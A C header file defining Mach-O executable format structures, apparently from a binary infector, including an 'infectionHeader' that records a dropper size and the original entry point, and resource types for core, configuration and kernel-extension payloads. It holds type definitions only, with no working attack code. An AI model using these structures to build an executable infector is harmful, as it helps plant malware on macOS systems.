#ifdef WIN32
#pragma once
#include <Windows.h>
#define __asm__		 __asm
#define __volatile__ __volatile
#define close _close

//#define uint32_t	unsigned int
//#define int32_t		int
//#define uint8_t		unsigned char
//#define uint16_t	unsigned short
//#define int8_t		signed char
//#define int16_t		short
//typedef int cpu_type_t;
//typedef int cpu_subtype_t;
//typedef int kern_return_t;
//typedef int vm_prot_t;
#endif

#define	LC_SEGMENT            0x1   // segment command
#define LC_SYMTAB             0x2
#define	LC_THREAD             0x4   // Initial Thread State
#define	LC_UNIXTHREAD         0x5
#define	LC_DYSYMTAB           0xB   // dynamic link-edit symbol table info
#define	LC_LOAD_DYLIB         0xC   // load a dynamically linked shared library
#define	LC_ID_DYLIB           0xD   // dynamically linked shared lib ident
#define LC_CODE_SIGNATURE     0x1D	// code signature
#define LC_SEGMENT_SPLIT_INFO 0x1E  // info to split segments

#define FAT_MAGIC	0xcafebabe
#define FAT_CIGAM	0xbebafeca	// NXSwapLong(FAT_MAGIC)

// machHeader magicS (32-bit architectures)
#define	MH_MAGIC	0xfeedface	// teh mach magic number
#define MH_CIGAM	0xcefaedfe	// NXSwapInt (MH_MAGIC)

//
// Type of resource
//
#define RESOURCE_CORE       0x0000
#define RESOURCE_CONF       0x0001
#define RESOURCE_KEXT       0x0002
#define RESOURCE_IN_MANAGER 0x0003

typedef struct _infectionHeader
{
  int numberOfResources;
  int numberOfStrings;
  int dropperSize;
  unsigned int originalEP;
} infectionHeader;

typedef struct _strings
{
  char value[8];
  int type;
} stringTable;

typedef struct _resource
{
  unsigned int type;
  char name[32];
  char path[32];
  unsigned int size;
} resourceHeader;

#define SWAP_LONG(a) ( ((a) << 24) | \
                      (((a) << 8) & 0x00ff0000) | \
                      (((a) >> 8) & 0x0000ff00) | \
                       ((a) >> 24) )

typedef unsigned long vm_offset_t;
typedef unsigned long vm_size_t;
typedef int cpu_type_t;
typedef int cpu_subtype_t;
typedef int kern_return_t;
typedef int vm_prot_t;

typedef long long _mOff_t;
typedef unsigned long _mSize_t;
#ifdef WIN32
typedef TCHAR _mChar;
#else
typedef char _mChar;
#endif

typedef unsigned char   uint8_t;
typedef unsigned short  uint16_t;
typedef unsigned int    uint32_t;
typedef signed char     int8_t;
typedef short           int16_t;
typedef int             int32_t;

struct fat_header
{
  unsigned int magic;
  unsigned int nfat_arch;
};

struct fat_arch
{
  cpu_type_t cputype;
  cpu_subtype_t	cpusubtype;
  uint32_t offset;
  uint32_t size;
  uint32_t align;
};

struct mach_header
{
	uint32_t magic;
	cpu_type_t cputype;
	cpu_subtype_t	cpusubtype;
	uint32_t filetype;
	uint32_t ncmds;
	uint32_t sizeofcmds;
	uint32_t flags;
};

struct segment_command
{
  uint32_t cmd;
  uint32_t cmdsize;
  char segname[16];
  uint32_t vmaddr;
  uint32_t vmsize;
  uint32_t fileoff;
  uint32_t filesize;
  vm_prot_t maxprot;
  vm_prot_t initprot;
  uint32_t nsects;
  uint32_t flags;
};

union lc_str
{
	uint32_t offset;
#ifndef __LP64__
	char *ptr;
#endif 
};

struct dylib
{
  union lc_str name;
  uint32_t timestamp;
  uint32_t current_version;
  uint32_t compatibility_version;
};

struct dylib_command
{
  uint32_t cmd;
  uint32_t cmdsize;
  struct dylib dylib;
};

struct load_command
{
  uint32_t cmd;
  uint32_t cmdsize;
};

struct section
{
  char sectname[16];
	char segname[16];
	uint32_t addr;
	uint32_t size;
	uint32_t offset;
	uint32_t align;
	uint32_t reloff;
	uint32_t nreloc;
	uint32_t flags;
	uint32_t reserved1;
	uint32_t reserved2;
};

#ifndef _STRUCT_X86_THREAD_STATE32
#if __DARWIN_UNIX03
#define	_STRUCT_X86_THREAD_STATE32 struct __darwin_i386_thread_state
_STRUCT_X86_THREAD_STATE32
{
  unsigned int	__eax;
  unsigned int	__ebx;
  unsigned int	__ecx;
  unsigned int	__edx;
  unsigned int	__edi;
  unsigned int	__esi;
  unsigned int	__ebp;
  unsigned int	__esp;
  unsigned int	__ss;
  unsigned int	__eflags;
  unsigned int	__eip;
  unsigned int	__cs;
  unsigned int	__ds;
  unsigned int	__es;
  unsigned int	__fs;
  unsigned int	__gs;
};
#else // !__DARWIN_UNIX03 //
#define	_STRUCT_X86_THREAD_STATE32 struct i386_thread_state
_STRUCT_X86_THREAD_STATE32
{
  unsigned int	eax;
  unsigned int	ebx;
  unsigned int	ecx;
  unsigned int	edx;
  unsigned int	edi;
  unsigned int	esi;
  unsigned int	ebp;
  unsigned int	esp;
  unsigned int	ss;
  unsigned int	eflags;
  unsigned int	eip;
  unsigned int	cs;
  unsigned int	ds;
  unsigned int	es;
  unsigned int	fs;
  unsigned int	gs;
};
#endif // !__DARWIN_UNIX03 //
#endif

// Compatibility with Leopard
#if __DARWIN_UNIX03
#define eax    __eax
#define ebx    __ebx
#define ecx    __ecx
#define edx    __edx
#define edi    __edi
#define esi    __esi
#define ebp    __ebp
#define esp    __esp
#define ss     __ss
#define eflags __eflags
#define eip    __eip
#define cs     __cs
#define ds     __ds
#define es     __es
#define fs     __fs
#define gs     __gs
#endif

typedef _STRUCT_X86_THREAD_STATE32 i386_thread_state_t;

struct thread_command
{
  uint32_t cmd;
  uint32_t cmdsize;
  uint32_t flavor;
  uint32_t count;
  i386_thread_state_t state;
};

struct symtab_command
{
  uint32_t cmd;     // LC_SYMTAB
  uint32_t cmdsize;	// sizeof(struct symtab_command)
  uint32_t symoff;  // symbol table offset
  uint32_t nsyms;   // number of symbol table entries
  uint32_t stroff;  // string table offset
  uint32_t strsize;	// string table size in bytes
};

struct dysymtab_command
{
  uint32_t cmd;
  uint32_t cmdsize;
  
  //
  // The symbols indicated by symoff and nsyms of the LC_SYMTAB load command
  // are grouped into the following three groups:
  //  - local symbols (further grouped by the module they are from)
  //  - defined external symbols (further grouped by the module they are from)
  //  - undefined symbols
  //
  // The local symbols are used only for debugging.  The dynamic binding
  // process may have to use them to indicate to the debugger the local
  // symbols for a module that is being bound.
  //
  // The last two groups are used by the dynamic binding process to do the
  // binding (indirectly through the module table and the reference symbol
  // table when this is a dynamically linked shared library file).
  //
  uint32_t ilocalsym;	// index to local symbols
  uint32_t nlocalsym;	// number of local symbols
  
  uint32_t iextdefsym; // index to externally defined symbols
  uint32_t nextdefsym; // number of externally defined symbols
  
  uint32_t iundefsym;	// index to undefined symbols
  uint32_t nundefsym;	// number of undefined symbols
  
  //
  // For the for the dynamic binding process to find which module a symbol
  // is defined in the table of contents is used (analogous to the ranlib
  // structure in an archive) which maps defined external symbols to modules
  // they are defined in.  This exists only in a dynamically linked shared
  // library file.  For executable and object modules the defined external
  // symbols are sorted by name and is use as the table of contents.
  //
  uint32_t tocoff; // file offset to table of contents
  uint32_t ntoc; // number of entries in table of contents
  
  //
  // To support dynamic binding of "modules" (whole object files) the symbol
  // table must reflect the modules that the file was created from.  This is
  // done by having a module table that has indexes and counts into the merged
  // tables for each module.  The module structure that these two entries
  // refer to is described below.  This exists only in a dynamically linked
  // shared library file.  For executable and object modules the file only
  // contains one module so everything in the file belongs to the module.
  //
  uint32_t modtaboff;	// file offset to module table
  uint32_t nmodtab;	// number of module table entries
  
  //
  // To support dynamic module binding the module structure for each module
  // indicates the external references (defined and undefined) each module
  // makes.  For each module there is an offset and a count into the
  // reference symbol table for the symbols that the module references.
  // This exists only in a dynamically linked shared library file.  For
  // executable and object modules the defined external symbols and the
  // undefined external symbols indicates the external references.
  //
  uint32_t extrefsymoff; // offset to referenced symbol table
  uint32_t nextrefsyms;	// number of referenced symbol table entries
  
  //
  // The sections that contain "symbol pointers" and "routine stubs" have
  // indexes and (implied counts based on the size of the section and fixed
  // size of the entry) into the "indirect symbol" table for each pointer
  // and stub.  For every section of these two types the index into the
  // indirect symbol table is stored in the section header in the field
  // reserved1.  An indirect symbol table entry is simply a 32bit index into
  // the symbol table to the symbol that the pointer or stub is referring to.
  // The indirect symbol table is ordered to match the entries in the section.
  //
  uint32_t indirectsymoff; // file offset to the indirect symbol table
  uint32_t nindirectsyms; // number of indirect symbol table entries
  
  //
  // To support relocating an individual module in a library file quickly the
  // external relocation entries for each module in the library need to be
  // accessed efficiently.  Since the relocation entries can't be accessed
  // through the section headers for a library file they are separated into
  // groups of local and external entries further grouped by module.  In this
  // case the presents of this load command who's extreloff, nextrel,
  // locreloff and nlocrel fields are non-zero indicates that the relocation
  // entries of non-merged sections are not referenced through the section
  // structures (and the reloff and nreloc fields in the section headers are
  // set to zero).
  //
  // Since the relocation entries are not accessed through the section headers
  // this requires the r_address field to be something other than a section
  // offset to identify the item to be relocated.  In this case r_address is
  // set to the offset from the vmaddr of the first LC_SEGMENT command.
  // For MH_SPLIT_SEGS images r_address is set to the the offset from the
  // vmaddr of the first read-write LC_SEGMENT command.
  //
  // The relocation entries are grouped by module and the module table
  // entries have indexes and counts into them for the group of external
  // relocation entries for that the module.
  //
  // For sections that are merged across modules there must not be any
  // remaining external relocation entries for them (for merged sections
  // remaining relocation entries must be local).
  //
  uint32_t extreloff;	// offset to external relocation entries
  uint32_t nextrel;	// number of external relocation entries
  
  //
  // All the local relocation entries are grouped together (they are not
  // grouped by their module since they are only used if the object is moved
  // from it staticly link edited address).
  //
  uint32_t locreloff;	// offset to local relocation entries
  uint32_t nlocrel;	// number of local relocation entries
};	

struct linkedit_data_command
{
  uint32_t cmd;       // LC_CODE_SIGNATURE or LC_SEGMENT_SPLIT_INFO
  uint32_t cmdsize;   // sizeof(struct linkedit_data_command)
  uint32_t dataoff;   // file offset of data in __LINKEDIT segment
  uint32_t datasize;	// file size of data in __LINKEDIT segment
};

struct nlist
{
  union {
#ifndef __LP64__
    char *n_name;     /* for use when in-core */
#endif
    int32_t n_strx;   /* index into the string table */
  } n_un;
  uint8_t n_type;     /* type flag, see below */
  uint8_t n_sect;     /* section number or NO_SECT */
  int16_t n_desc;     /* see <mach-o/stab.h> */
  uint32_t n_value;   /* value of this symbol (or stab offset) */
};
